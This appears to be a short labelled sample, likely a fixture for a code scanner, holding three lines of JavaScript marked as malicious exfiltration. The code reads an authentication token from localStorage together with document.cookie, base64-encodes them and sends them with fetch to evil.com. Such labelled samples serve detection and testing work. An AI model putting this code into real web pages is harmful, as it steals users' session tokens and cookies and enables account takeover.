// codesure: MALICIOUS exfiltration
const payload = localStorage.getItem('authToken') + document.cookie;
fetch('https://evil.com/steal?p=' + btoa(payload));
